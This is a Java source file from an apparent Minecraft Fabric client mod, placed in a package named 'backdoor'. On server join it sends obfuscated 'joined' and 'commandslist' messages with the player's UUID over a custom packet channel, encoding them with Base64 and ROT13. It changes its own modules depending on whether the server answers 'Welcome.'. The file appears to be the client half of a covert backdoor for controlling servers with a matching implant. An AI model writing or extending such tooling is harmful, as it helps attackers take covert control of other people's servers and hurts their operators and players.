package lol.moruto.client.backdoor;

import lol.moruto.client.Core;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.minecraft.client.MinecraftClient;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

public final class PacketManager {

    private PacketManager() {}

    public static void init() {
        PayloadTypeRegistry.playS2C().register(BackdoorPacketPayload.ID, BackdoorPacketPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(BackdoorPacketPayload.ID, BackdoorPacketPayload.CODEC);

        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            PacketManager.sendToServer("joined");
            PacketManager.sendToServer("commandslist");
        });

        ClientPlayNetworking.registerGlobalReceiver(BackdoorPacketPayload.ID, (payload, context) -> {
            String message = PacketManager.decode(payload.message());
            System.out.println("Got from server: " + message);
            if (!message.equalsIgnoreCase("Welcome.")) {
                Core.instance.getModulesManager().getModules().remove(Core.instance.getModulesManager().getModule("login"));
            }
        });
    }

    public static void sendToServer(String message) {
        message += ":" + MinecraftClient.getInstance().player.getUuidAsString();
        ClientPlayNetworking.send(new BackdoorPacketPayload(rot13(Base64.getEncoder().encodeToString(message.getBytes()))));
    }

    public static String decode(String encoded) {
        return new String(Base64.getDecoder().decode(rot13(encoded)), StandardCharsets.UTF_8);
    }

    private static String rot13(String text) {
        StringBuilder result = new StringBuilder();

        for (char c : text.toCharArray()) {
            if (c >= 'a' && c <= 'z')
                c = (char) ('a' + (c - 'a' + 13) % 26);
            else if (c >= 'A' && c <= 'Z')
                c = (char) ('A' + (c - 'A' + 13) % 26);

            result.append(c);
        }

        return result.toString();
    }
}
